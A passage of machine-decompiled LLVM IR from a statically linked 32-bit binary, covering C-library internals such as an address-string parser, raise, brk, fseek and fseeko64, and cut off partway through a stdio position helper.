  br i1 %v1_8052457, label %dec_label_pc_80524d8, label %dec_label_pc_805245b

dec_label_pc_805245b:                             ; preds = %entry
  %v4_8052453 = ptrtoint i8* %arg1 to i32
  %v0_8052466.pre = load i32, i32* @global_var_8055684, align 4
  br label %dec_label_pc_8052466

dec_label_pc_8052466:                             ; preds = %dec_label_pc_805245b, %dec_label_pc_80524af
  %v2_80524af34 = phi i32 [ 1, %dec_label_pc_805245b ], [ %v3_80524af, %dec_label_pc_80524af ]
  %v0_805246c33 = phi i32 [ %v4_8052453, %dec_label_pc_805245b ], [ %v0_805246c3, %dec_label_pc_80524af ]
  %v0_80524cd32 = phi i32 [ 0, %dec_label_pc_805245b ], [ %v2_80524b5, %dec_label_pc_80524af ]
  %v1_805246c = inttoptr i32 %v0_805246c33 to i8*
  %v2_805246c = load i8, i8* %v1_805246c, align 1
  %v3_805246c = sext i8 %v2_805246c to i32
  %v2_805246f = mul nsw i32 %v3_805246c, 2
  %v3_805246f = add i32 %v2_805246f, %v0_8052466.pre
  %v4_805246f = inttoptr i32 %v3_805246f to i8*
  %v5_805246f = load i8, i8* %v4_805246f, align 1
  %v6_805246f = and i8 %v5_805246f, 8
  %v7_805246f = icmp eq i8 %v6_805246f, 0
  br i1 %v7_805246f, label %dec_label_pc_80524d8, label %dec_label_pc_8052476

dec_label_pc_8052476:                             ; preds = %dec_label_pc_8052466
  %v4_805248a.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805248a

dec_label_pc_805247a:                             ; preds = %dec_label_pc_805248a
  %v3_805247a = mul i32 %v1_805247a, 10
  %v2_805247d = add i32 %v3_805247a, -48
  %v3_805247d = add i32 %v2_805247d, %v2_805248c
  %v1_8052481 = add i32 %v3_805247d, -255
  %v6_8052481 = sub i32 254, %v3_805247d
  %v7_8052481 = and i32 %v6_8052481, %v3_805247d
  %v8_8052481 = icmp slt i32 %v7_8052481, 0
  %v9_8052481 = icmp eq i32 %v1_8052481, 0
  %v10_8052481 = icmp slt i32 %v1_8052481, 0
  %v3_8052487 = icmp eq i1 %v10_8052481, %v8_8052481
  %v4_8052487 = icmp eq i1 %v9_8052481, false
  %v5_8052487 = and i1 %v4_8052487, %v3_8052487
  br i1 %v5_8052487, label %dec_label_pc_80524d8, label %dec_label_pc_8052489

dec_label_pc_8052489:                             ; preds = %dec_label_pc_805247a
  %v1_8052489 = add i32 %v0_8052489, 1
  br label %dec_label_pc_805248a

dec_label_pc_805248a:                             ; preds = %dec_label_pc_8052476, %dec_label_pc_8052489
  %v1_805247a = phi i32 [ 0, %dec_label_pc_8052476 ], [ %v3_805247d, %dec_label_pc_8052489 ]
  %v4_805248a = phi i32 [ %v4_805248a.pre, %dec_label_pc_8052476 ], [ %v6_805248a, %dec_label_pc_8052489 ]
  %v0_8052489 = phi i32 [ %v0_805246c33, %dec_label_pc_8052476 ], [ %v1_8052489, %dec_label_pc_8052489 ]
  %v1_805248a = inttoptr i32 %v0_8052489 to i8*
  %v2_805248a = load i8, i8* %v1_805248a, align 1
  %v3_805248a = zext i8 %v2_805248a to i32
  %v5_805248a = and i32 %v4_805248a, -256
  %v6_805248a = or i32 %v3_805248a, %v5_805248a
  store i32 %v6_805248a, i32* @edx, align 4
  %v2_805248c = sext i8 %v2_805248a to i32
  %v2_805248f = mul nsw i32 %v2_805248c, 2
  %v3_805248f = add i32 %v2_805248f, %v0_8052466.pre
  %v4_805248f = inttoptr i32 %v3_805248f to i16*
  %v5_805248f = load i16, i16* %v4_805248f, align 2
  %v2_8052494 = and i16 %v5_805248f, 8
  %v3_8052494 = icmp eq i16 %v2_8052494, 0
  %v1_8052496 = icmp eq i1 %v3_8052494, false
  br i1 %v1_8052496, label %dec_label_pc_805247a, label %dec_label_pc_8052498

dec_label_pc_8052498:                             ; preds = %dec_label_pc_805248a
  %v8_8052498 = sub nsw i32 2, %v2_80524af34
  %v9_8052498 = and i32 %v8_8052498, %v2_80524af34
  %v10_8052498 = icmp slt i32 %v9_8052498, 0
  %v11_8052498 = icmp eq i32 %v2_80524af34, 3
  %v12_8052498 = icmp slt i32 %v2_80524af34, 3
  %v3_805249c = icmp eq i1 %v12_8052498, %v10_8052498
  %v4_805249c = icmp eq i1 %v11_8052498, false
  %v5_805249c = and i1 %v4_805249c, %v3_805249c
  br i1 %v5_805249c, label %dec_label_pc_80524a6, label %dec_label_pc_805249e

dec_label_pc_805249e:                             ; preds = %dec_label_pc_8052498
  %v10_805249e = icmp eq i8 %v2_805248a, 46
  %v1_80524a1 = icmp eq i1 %v10_805249e, false
  br i1 %v1_80524a1, label %dec_label_pc_80524d8, label %dec_label_pc_80524a3

dec_label_pc_80524a3:                             ; preds = %dec_label_pc_805249e
  %v1_80524a3 = add i32 %v0_8052489, 1
  br label %dec_label_pc_80524af

dec_label_pc_80524a6:                             ; preds = %dec_label_pc_8052498
  %v1_80524a6 = add i32 %v0_8052489, 1
  %v4_80524a7 = icmp eq i8 %v2_805248a, 0
  br i1 %v4_80524a7, label %dec_label_pc_80524af, label %dec_label_pc_80524ab

dec_label_pc_80524ab:                             ; preds = %dec_label_pc_80524a6
  %v2_80524ab = and i16 %v5_805248f, 32
  %v3_80524ab = icmp eq i16 %v2_80524ab, 0
  br i1 %v3_80524ab, label %dec_label_pc_80524d8, label %dec_label_pc_80524af

dec_label_pc_80524af:                             ; preds = %dec_label_pc_80524ab, %dec_label_pc_80524a6, %dec_label_pc_80524a3
  %v0_805246c3 = phi i32 [ %v1_80524a6, %dec_label_pc_80524ab ], [ %v1_80524a6, %dec_label_pc_80524a6 ], [ %v1_80524a3, %dec_label_pc_80524a3 ]
  %v3_80524af = add nuw nsw i32 %v2_80524af34, 1
  %v2_80524b2 = mul i32 %v0_80524cd32, 256
  %v2_80524b5 = or i32 %v1_805247a, %v2_80524b2
  %v7_80524bb = icmp sgt i32 %v2_80524af34, 3
  br i1 %v7_80524bb, label %dec_label_pc_80524bd, label %dec_label_pc_8052466

dec_label_pc_80524bd:                             ; preds = %dec_label_pc_80524af
  %v4_80524bd = icmp eq i32 %arg2, 0
  br i1 %v4_80524bd, label %dec_label_pc_80524da, label %dec_label_pc_80524c9

dec_label_pc_80524c9:                             ; preds = %dec_label_pc_80524bd
  %v1_80524cd = call i32 @llvm.bswap.i32(i32 %v2_80524b5)
  %v2_80524cf = inttoptr i32 %arg2 to i32*
  store i32 %v1_80524cd, i32* %v2_80524cf, align 4
  br label %dec_label_pc_80524da

dec_label_pc_80524d8:                             ; preds = %dec_label_pc_80524ab, %dec_label_pc_805249e, %dec_label_pc_8052466, %dec_label_pc_805247a, %entry
  br label %dec_label_pc_80524da

dec_label_pc_80524da:                             ; preds = %dec_label_pc_80524bd, %dec_label_pc_80524c9, %dec_label_pc_80524d8
  %v0_80524df = phi i32 [ 1, %dec_label_pc_80524bd ], [ 1, %dec_label_pc_80524c9 ], [ 0, %dec_label_pc_80524d8 ]
  ret i32 %v0_80524df

; uselistorder directives
  uselistorder i32 %v2_805248c, { 1, 0 }
  uselistorder i32 %v6_805248a, { 1, 0 }
  uselistorder i8 %v2_805248a, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8052489, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8052481, { 1, 0 }
  uselistorder i32 %v3_805247d, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805246c33, { 1, 0 }
  uselistorder i32 %v2_80524af34, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 3, 0, 2, 1 }
  uselistorder i8 46, { 0, 2, 1 }
  uselistorder i32 -255, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 -48, { 2, 1, 0 }
  uselistorder i32 10, { 4, 5, 6, 14, 0, 8, 19, 21, 7, 23, 15, 1, 16, 12, 13, 9, 10, 20, 3, 22, 17, 18, 11, 2 }
  uselistorder i8 8, { 9, 3, 4, 5, 6, 7, 8, 1, 2, 0 }
  uselistorder i8* null, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80524da, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80524d8, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805248a, { 1, 0 }
  uselistorder label %dec_label_pc_8052466, { 1, 0 }
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80524e3 = call i32 @__libc_getpid()
  %v2_80524ef = call i32 @kill(i32 %v0_80524e3, i32 %arg1)
  ret i32 %v2_80524ef

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 3, 2, 1 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_80524f8 = load i32, i32* @eax, align 4
  %v1_80524f8 = add i32 %v0_80524f8, 28
  %v2_80524f8 = inttoptr i32 %v1_80524f8 to i32*
  %v3_80524f8 = load i32, i32* %v2_80524f8, align 4
  store i32 %v3_80524f8, i32* @global_var_805bd98.172, align 8
  %v1_8052501 = add i32 %v0_80524f8, 44
  %v2_8052501 = inttoptr i32 %v1_8052501 to i32*
  %v3_8052501 = load i32, i32* %v2_8052501, align 4
  store i32 %v3_8052501, i32* @global_var_805bd9c.173, align 4
  ret i32 %v3_8052501
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805250c = load i32, i32* @ebx, align 4
  store i32 %v0_805250c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_805251f = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_805251f, i32* @global_var_805b97c.163, align 4
  %v7_805252a = icmp ult i32 %v1_805251f, %arg1
  %v1_805252c = icmp eq i1 %v7_805252a, false
  br i1 %v1_805252c, label %dec_label_pc_805253c, label %dec_label_pc_805252e

dec_label_pc_805252e:                             ; preds = %entry
  %v0_805252e = load i32, i32* %stack_var_-4, align 4
  %v1_805252e = call i32 @__errno_location(i32 %v0_805252e)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8052536 = inttoptr i32 %v1_805252e to i32*
  store i32 12, i32* %v1_8052536, align 4
  %v0_805253d.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805253c

dec_label_pc_805253c:                             ; preds = %entry, %dec_label_pc_805252e
  %v0_805253d = phi i32 [ 0, %entry ], [ %v0_805253d.pre, %dec_label_pc_805252e ]
  %v2_8052540 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052540, i32* @ebx, align 4
  ret i32 %v0_805253d

; uselistorder directives
  uselistorder i32 %v1_805251f, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 12, { 76, 39, 40, 41, 42, 43, 44, 45, 46, 0, 6, 7, 47, 48, 49, 110, 11, 36, 67, 75, 37, 38, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 10, 109, 111, 50, 51, 1, 2, 52, 53, 4, 5, 54, 3, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 8, 66, 68, 9, 69, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 70, 71, 72, 73, 74 }
  uselistorder i32* @global_var_805b97c.163, { 1, 0, 2 }
  uselistorder i32 45, { 1, 3, 0, 4, 2 }
  uselistorder label %dec_label_pc_805253c, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_805254f = ashr i32 %arg2, 31
  %v4_8052556 = inttoptr i32 %arg1 to i16*
  %v5_8052556 = call i32 @__GI_fseeko64(i16* %v4_8052556, i32 %arg2, i32 %v1_805254f, i32 %arg3)
  ret i32 %v5_8052556
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8052560 = load i32, i32* @ebp, align 4
  %v0_8052561 = load i32, i32* @edi, align 4
  %v0_8052562 = load i32, i32* @esi, align 4
  %v0_8052563 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_8052573 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8052573, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp = icmp ult i32 %arg4, 3
  br i1 %tmp, label %dec_label_pc_8052597, label %dec_label_pc_8052584

dec_label_pc_8052584:                             ; preds = %entry
  %v1_8052584 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_8052584, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_805258c = inttoptr i32 %v1_8052584 to i32*
  store i32 22, i32* %v1_805258c, align 4
  br label %dec_label_pc_805263d

dec_label_pc_8052597:                             ; preds = %entry
  %v1_8052597 = add i32 %v4_8052573, 52
  %v2_8052597 = inttoptr i32 %v1_8052597 to i32*
  %v3_8052597 = load i32, i32* %v2_8052597, align 4
  %v1_805259a = icmp eq i32 %v3_8052597, 0
  %v1_805259c = icmp eq i1 %v1_805259a, false
  br i1 %v1_805259c, label %dec_label_pc_80525bd, label %dec_label_pc_805259e

dec_label_pc_805259e:                             ; preds = %dec_label_pc_8052597
  %v1_805259e = add i32 %v4_8052573, 56
  store i32 %v1_805259e, i32* @ebx, align 4
  %v2_80525a8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80525a8, i32* @eax, align 4
  %v3_80525ad = call i32 @__pthread_return_void(i32 %v2_80525a8, i32 134550239)
  store i32 %v3_80525ad, i32* %eax.global-to-local, align 4
  %v0_80525b2 = load i32, i32* @ebx, align 4
  %v2_80525b5 = call i32 @__pthread_return_0(i32 %v0_80525b2)
  store i32 %v2_80525b5, i32* %eax.global-to-local, align 4
  %v0_80525bd.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80525bd

dec_label_pc_80525bd:                             ; preds = %dec_label_pc_8052597, %dec_label_pc_805259e
  %v0_80525c5 = phi i32 [ %v4_8052573, %dec_label_pc_8052597 ], [ %v0_80525bd.pre, %dec_label_pc_805259e ]
  %v1_80525bd = inttoptr i32 %v0_80525c5 to i8*
  %v2_80525bd = load i8, i8* %v1_80525bd, align 1
  %v3_80525bd = and i8 %v2_80525bd, 64
  %v4_80525bd = icmp eq i8 %v3_80525bd, 0
  br i1 %v4_80525bd, label %dec_label_pc_80525d2, label %dec_label_pc_80525c2

dec_label_pc_80525c2:                             ; preds = %dec_label_pc_80525bd
  %v2_80525c6 = call i32 @__stdio_wcommit(i32 %v0_80525c5)
  store i32 %v2_80525c6, i32* %eax.global-to-local, align 4
  %v1_80525ce = icmp eq i32 %v2_80525c6, 0
  %v1_80525d0 = icmp eq i1 %v1_80525ce, false
  br i1 %v1_80525d0, label %dec_label_pc_8052625, label %dec_label_pc_80525d2

dec_label_pc_80525d2:                             ; preds = %dec_label_pc_80525c2, %dec_label_pc_80525bd
  %v0_80525d2 = load i32, i32* @edi, align 4
  %v9_80525d2 = icmp eq i32 %v0_80525d2, 1
  %v1_80525d5 = icmp eq i1 %v9_80525d2, false
  br i1 %v1_80525d5, label %dec_label_pc_80525d2.dec_label_pc_80525eb_crit_edge, label %dec_label_pc_80525d7

dec_label_pc_80525d2.dec_label_pc_80525eb_crit_edge: ; preds = %dec_label_pc_80525d2
  %.pre7 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_80525eb

dec_label_pc_80525d7:                             ; preds = %dec_label_pc_80525d2
  %v0_80525d7 = load i32, i32* @ecx, align 4
  %v2_80525d9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_80525d9, i32* %eax.global-to-local, align 4
  %v0_80525de = load i32, i32* @esi, align 4
  %v5_80525de = inttoptr i32 %v0_80525de to i16*
  %v6_80525df = call i32 @__stdio_adjust_position(i16* %v5_80525de, i32 %v2_80525d9, i32 %v0_80525d7, i32 %v0_80525d7)
  store i32 %v6_80525df, i32* %eax.global-to-local, align 4
  %v2_80525e7 = icmp slt i32 %v6_80525df, 0
  br i1 %v2_80525e7, label %dec_label_pc_8052625, label %dec_label_pc_80525d7.dec_label_pc_80525eb_crit_edge

dec_label_pc_80525d7.dec_label_pc_80525eb_crit_edge: ; preds = %dec_label_pc_80525d7
  %v0_80525ec.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80525eb

dec_label_pc_80525eb:                             ; preds = %dec_label_pc_80525d2.dec_label_pc_80525eb_crit_edge, %dec_label_pc_80525d7.dec_label_pc_80525eb_crit_edge
  %v2_80525ed.pre-phi = phi i32 [ %.pre7, %dec_label_pc_80525d2.dec_label_pc_80525eb_crit_edge ], [ %v2_80525d9, %dec_label_pc_80525d7.dec_label_pc_80525eb_crit_edge ]
  %v0_80525ec = phi i32 [ %v0_80525d2, %dec_label_pc_80525d2.dec_label_pc_80525eb_crit_edge ], [ %v0_80525ec.pre, %dec_label_pc_80525d7.dec_label_pc_80525eb_crit_edge ]
  %v0_80525eb = load i32, i32* @edx, align 4
  store i32 %v2_80525ed.pre-phi, i32* %eax.global-to-local, align 4
  %v0_80525f2 = load i32, i32* @esi, align 4
  %v5_80525f3 = inttoptr i32 %v2_80525ed.pre-phi to i32*
  %v6_80525f3 = call i32 @__stdio_seek(i32 %v0_80525f2, i32* %v5_80525f3, i32 %v0_80525ec, i32 %v0_80525eb)
  store i32 %v6_80525f3, i32* %eax.global-to-local, align 4
  %v2_80525fb = icmp slt i32 %v6_80525f3, 0
  br i1 %v2_80525fb, label %dec_label_pc_8052625, label %dec_label_pc_80525ff

dec_label_pc_80525ff:                             ; preds = %dec_label_pc_80525eb
  %v0_80525ff = load i32, i32* @esi, align 4
  %v1_80525ff = inttoptr i32 %v0_80525ff to i32*
  %v2_80525ff = load i32, i32* %v1_80525ff, align 4
  store i32 %v2_80525ff, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8052603 = add i32 %v0_80525ff, 44
  %v2_8052603 = inttoptr i32 %v1_8052603 to i32*
  store i32 0, i32* %v2_8052603, align 4
  %v0_805260a = load i32, i32* @esi, align 4
  %v1_805260a = add i32 %v0_805260a, 2
  %v2_805260a = inttoptr i32 %v1_805260a to i8*
  store i8 0, i8* %v2_805260a, align 1
  %v0_805260e = load i32, i32* %eax.global-to-local, align 4
  %v1_805260e = and i32 %v0_805260e, -72
  store i32 %v1_805260e, i32* %eax.global-to-local, align 4
  %v1_8052611 = trunc i32 %v1_805260e to i16
  %v2_8052611 = load i32, i32* @esi, align 4
  %v3_8052611 = inttoptr i32 %v2_8052611 to i16*
  store i16 %v1_8052611, i16* %v3_8052611, align 2
  %v0_8052614 = load i32, i32* @esi, align 4
  %v1_8052614 = add i32 %v0_8052614, 8
  %v2_8052614 = inttoptr i32 %v1_8052614 to i32*
  %v3_8052614 = load i32, i32* %v2_8052614, align 4
  store i32 %v3_8052614, i32* %eax.global-to-local, align 4
  %v2_8052617 = add i32 %v0_8052614, 16
  %v3_8052617 = inttoptr i32 %v2_8052617 to i32*
  store i32 %v3_8052614, i32* %v3_8052617, align 4
  %v0_805261a = load i32, i32* %eax.global-to-local, align 4
  %v1_805261a = load i32, i32* @esi, align 4
  %v2_805261a = add i32 %v1_805261a, 20
  %v3_805261a = inttoptr i32 %v2_805261a to i32*
  store i32 %v0_805261a, i32* %v3_805261a, align 4
  %v0_805261d = load i32, i32* %eax.global-to-local, align 4
  %v1_805261d = load i32, i32* @esi, align 4
  %v2_805261d = add i32 %v1_805261d, 24
  %v3_805261d = inttoptr i32 %v2_805261d to i32*
  store i32 %v0_805261d, i32* %v3_805261d, align 4
  %v0_8052620 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052620 = load i32, i32* @esi, align 4
  %v2_8052620 = add i32 %v1_8052620, 28
  %v3_8052620 = inttoptr i32 %v2_8052620 to i32*
  store i32 %v0_8052620, i32* %v3_8052620, align 4
  br label %dec_label_pc_8052628

dec_label_pc_8052625:                             ; preds = %dec_label_pc_80525eb, %dec_label_pc_80525d7, %dec_label_pc_80525c2
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052628

dec_label_pc_8052628:                             ; preds = %dec_label_pc_80525ff, %dec_label_pc_8052625
  br i1 %v1_805259c, label %dec_label_pc_805263d, label %dec_label_pc_805262c

dec_label_pc_805262c:                             ; preds = %dec_label_pc_8052628
  %v2_8052630 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8052630, i32* @eax, align 4
  %v3_8052635 = call i32 @__pthread_return_void(i32 %v2_8052630, i32 1)
  store i32 %v3_8052635, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805263d

dec_label_pc_805263d:                             ; preds = %dec_label_pc_8052628, %dec_label_pc_8052584, %dec_label_pc_805262c
  %v0_8052640 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8052640, i32* %eax.global-to-local, align 4
  store i32 %v0_8052563, i32* @ebx, align 4
  store i32 %v0_8052562, i32* @esi, align 4
  store i32 %v0_8052561, i32* @edi, align 4
  store i32 %v0_8052560, i32* @ebp, align 4
  ret i32 %v0_8052640

; uselistorder directives
  uselistorder i32 %v2_80525ed.pre-phi, { 1, 0 }
  uselistorder i32 %v0_80525d2, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 28, { 7, 20, 8, 3, 9, 10, 11, 12, 13, 14, 15, 0, 16, 21, 17, 18, 1, 2, 19, 4, 5, 6 }
  uselistorder i32 24, { 23, 24, 17, 21, 37, 22, 25, 26, 27, 28, 29, 30, 31, 38, 14, 32, 33, 34, 35, 15, 36, 16, 11, 9, 18, 10, 7, 19, 8, 5, 20, 6, 4, 2, 3, 12, 0, 1, 13 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8 64, { 1, 2, 0 }
  uselistorder i32 (i32)* @__pthread_return_0, { 11, 3, 8, 13, 12, 7, 2, 1, 0, 6, 5, 10, 4, 9 }
  uselistorder i32 (i32, i32)* @__pthread_return_void, { 15, 14, 1, 0, 9, 8, 19, 18, 17, 16, 7, 6, 5, 4, 3, 2, 13, 12, 11, 10 }
  uselistorder i32 56, { 2, 1, 0, 3, 5, 4 }
  uselistorder i32 52, { 1, 0, 5, 6, 2, 3, 7, 4 }
  uselistorder i32 22, { 6, 11, 2, 3, 4, 5, 7, 10, 8, 9, 12, 0, 1 }
  uselistorder i32* @esi, { 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 4, 60, 61, 167, 168, 169, 170, 171, 225, 226, 227, 228, 62, 63, 64, 5, 65, 66, 67, 68, 69, 70, 71, 193, 194, 195, 229, 230, 231, 232, 233, 241, 244, 245, 246, 72, 73, 74, 75, 76, 77, 78, 234, 239, 240, 39, 40, 41, 42, 43, 44, 181, 182, 183, 0, 184, 185, 186, 45, 46, 47, 48, 49, 196, 201, 6, 202, 203, 204, 205, 206, 207, 208, 197, 198, 199, 200, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 7, 220, 21, 221, 222, 223, 224, 154, 155, 156, 157, 158, 247, 8, 248, 249, 79, 9, 80, 22, 19, 81, 191, 192, 256, 257, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 11, 97, 1, 99, 100, 101, 102, 10, 103, 104, 98, 105, 106, 107, 108, 2, 109, 110, 111, 112, 113, 114, 115, 20, 12, 116, 117, 13, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 14, 135, 136, 137, 15, 38, 118, 3, 119, 120, 16, 17, 138, 235, 236, 237, 238, 250, 251, 252, 253, 254, 255, 139, 140, 18, 141, 142, 242, 243, 189, 190, 143, 144, 145, 146, 147, 150, 148, 149, 151, 152, 153, 159, 160, 161, 162, 163, 164, 165, 166, 172, 173, 174, 175, 176, 177, 178, 179, 180, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 187, 188, 258 }
  uselistorder i32* @edi, { 28, 0, 29, 30, 31, 123, 124, 125, 126, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 1, 43, 44, 45, 46, 47, 48, 49, 205, 206, 207, 2, 208, 209, 212, 213, 162, 163, 164, 214, 215, 230, 50, 3, 51, 52, 53, 21, 22, 23, 24, 25, 26, 27, 136, 137, 138, 139, 140, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 4, 195, 196, 197, 198, 199, 100, 101, 102, 103, 104, 54, 55, 5, 56, 228, 229, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 6, 81, 18, 19, 20, 67, 7, 68, 69, 82, 224, 225, 226, 227, 83, 84, 85, 210, 211, 141, 142, 160, 161, 165, 166, 221, 222, 223, 167, 168, 86, 87, 88, 216, 217, 218, 219, 220, 89, 90, 91, 92, 93, 94, 97, 95, 96, 98, 99, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 127, 128, 129, 130, 131, 132, 133, 134, 135, 143, 144, 145, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 169, 170, 171, 200, 201, 202, 203, 204 }
  uselistorder i32* @ebp, { 10, 11, 12, 13, 14, 15, 16, 112, 17, 18, 7, 8, 9, 54, 55, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 98, 94, 95, 96, 97, 0, 99, 2, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 1, 40, 4, 5, 6, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 3, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 100, 101, 102, 103, 106, 107, 104, 105, 108, 109, 113, 110, 111 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805263d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052628, { 1, 0 }
  uselistorder label %dec_label_pc_80525eb, { 1, 0 }
  uselistorder label %dec_label_pc_80525bd, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v4_8052650 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8052650, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_8052658 = load i16, i16* %arg1, align 2
  %v3_8052658 = zext i16 %v2_8052658 to i32
  store i32 %v3_8052658, i32* %ecx.global-to-local, align 4
  %tmp = urem i16 %v2_8052658, 4
  %v1_805265d = zext i16 %tmp to i32
  %v2_805265d = icmp eq i16 %tmp, 0
  br i1 %v2_805265d, label %dec_label_pc_805268c, label %dec_label_pc_8052662

dec_label_pc_8052662:                             ; preds = %entry
  %v1_8052664 = add nsw i32 %v1_805265d, -1
  %v8_8052664 = icmp eq i32 %v1_8052664, 0
  store i32 %v1_8052664, i32* @edx, align 4
  br i1 %v8_8052664, label %dec_label_pc_805268c, label %dec_label_pc_8052667

dec_label_pc_8052667:                             ; preds = %dec_label_pc_8052662
  %v3_8052667 = and i32 %v3_8052658, 2048
  %v4_8052667 = icmp eq i32 %v3_8052667, 0
  br i1 %v4_8052667, label %dec_label_pc_805268c, label %dec_label_pc_805266c

dec_label_pc_805266c:                             ; preds = %dec_label_pc_8052667
  %v6_805266c = sub nsw i32 1, %v1_805265d
  %v7_805266c = and i32 %v1_8052664, %v6_805266c
  %v8_805266c = icmp slt i32 %v7_805266c, 0
  %v9_805266c = icmp eq i16 %tmp, 2
  %v10_805266c = icmp ult i16 %tmp, 2
  %v3_805266f = icmp eq i1 %v10_805266c, %v8_805266c
  %v4_805266f = icmp eq i1 %v9_805266c, false
  %v5_805266f = and i1 %v4_805266f, %v3_805266f
  br i1 %v5_805266f, label %dec_label_pc_80526e0, label %dec_label_pc_8052671

dec_label_pc_8052671:                             ; preds = %dec_label_pc_805266c
  %v1_8052671 = add i32 %v4_8052650, 40
  %v2_8052671 = inttoptr i32 %v1_8052671 to i32*
  %v3_8052671 = load i32, i32* %v2_8052671, align 4
  %v4_8052671 = icmp eq i32 %v3_8052671, 0
  %v1_8052675 = icmp eq i1 %v4_8052671, false
  br i1 %v1_8052675, label %dec_label_pc_80526e0, label %dec_label_pc_8052677

dec_label_pc_8052677:                             ; preds = %dec_label_pc_8052671
  %v1_8052677 = add i32 %v4_8052650, 3
  %v2_8052677 = inttoptr i32 %v1_8052677 to i8*
